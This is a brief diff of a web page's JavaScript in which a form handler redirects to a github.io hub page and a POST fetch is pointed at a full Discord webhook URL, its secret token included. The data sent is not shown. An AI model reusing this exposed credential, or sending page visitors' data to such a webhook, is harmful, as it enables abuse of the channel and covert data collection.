@@ -6,7 +6,7 @@ document.querySelector("#rizz").addEventListener("submit", (e) => {
         window.location.href = "https://koenigseggregera.github.io/hub.html";
     }
 });
-fetch("webhook link", {
+fetch("https://discord.com/api/webhooks/1351015431464550431/GL-jIECWU2kmIG7zQx1sTPC9i5THVnWwzrtO1VHRjQG4rkRCwHYh9dBkcBqaqyDNEbV2", {
   method: "POST",
   headers: {
     "content-type": "application/json"
